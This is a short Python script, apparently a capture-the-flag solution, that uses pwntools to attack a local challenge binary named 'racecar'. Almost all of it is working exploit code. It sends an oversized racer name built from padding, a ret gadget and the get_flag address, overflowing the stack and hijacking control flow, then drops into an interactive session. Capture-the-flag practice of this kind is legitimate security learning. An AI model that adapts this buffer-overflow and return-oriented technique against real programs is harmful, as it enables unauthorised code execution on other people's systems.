#!/usr/bin/env python3
from pwn import *

elf = ELF("./racecar")
p = elf.process()
context.update(binary=elf, log_level="DEBUG")
# gdb.attach(
#     p,
#     """
#     b *main+118
#     b *main+123
#     b *main+109    
#     b *race
#     b *main+536
#     """,
# )


def addRacer(name):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"racer: ", name)
    return

def race():
    p.sendlineafter(b"> ", b"2")
    return

def Exit():
    p.sendlineafter(b"> ", b"3")


addRacer(b"0"*0x100)
get_flag = 0x4013E5
ret = 0x000000000040101a #: ret
addRacer(b"1"*0x28 + p64(ret) + p64(elf.symbols["get_flag"]))
while True:
    race()
    p.recvuntil(b'winner: ')
    output = p.recvline()[:-1]
    print(output)
    if len(output) > 0x100:
        break

p.interactive()